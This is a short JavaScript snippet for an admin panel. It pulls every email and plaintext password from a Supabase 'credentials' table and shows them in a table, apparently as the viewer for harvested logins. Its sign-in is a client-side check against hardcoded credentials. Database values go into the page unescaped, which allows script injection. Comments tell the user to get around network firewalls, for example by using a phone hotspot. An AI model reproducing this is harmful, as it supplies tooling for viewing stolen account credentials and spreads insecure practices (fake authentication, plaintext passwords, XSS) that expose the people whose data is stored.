<script>
    // Initialize Supabase
    const _supabase = supabase.createClient('https://supabase.co', 'sb_publishable_MZZ1I6MzxmRZDXWxfkRfXQ_UhwCCMK_');

    async function doLogin() {
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;

        // 🛡️ FIREWALL BYPASS: Check credentials locally first
        // This lets you into the dashboard even if the network blocks Supabase
        if (user === "adminadminadmin123" && pass === "ILOVE67KID") {
            console.log("Local bypass successful. Loading data...");
            loadData(); 
        } else {
            alert("Invalid Admin Credentials");
        }
    }

    async function loadData() {
        document.getElementById('loginSection').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';

        const tbody = document.getElementById('list');
        tbody.innerHTML = '<tr><td colspan="3">Attempting to fetch data through firewall...</td></tr>';

        try {
            const { data, error } = await _supabase.from('credentials').select('*');
            
            if (error) throw error;

            tbody.innerHTML = '';
            if (data && data.length > 0) {
                data.forEach(r => {
                    tbody.innerHTML += `<tr><td>${r.email}</td><td>${r.password}</td><td>${new Date(r.created_at).toLocaleString()}</td></tr>`;
                });
            } else {
                tbody.innerHTML = '<tr><td colspan="3">No data found in database.</td></tr>';
            }
        } catch (err) {
            console.error(err);
            tbody.innerHTML = `<tr><td colspan="3" style="color:red;">🔥 FIREWALL ERROR: The network blocked the data fetch. You MUST use a phone hotspot to see this list.</td></tr>`;
        }
    }

    function logout() {
        location.reload();
    }
</script>
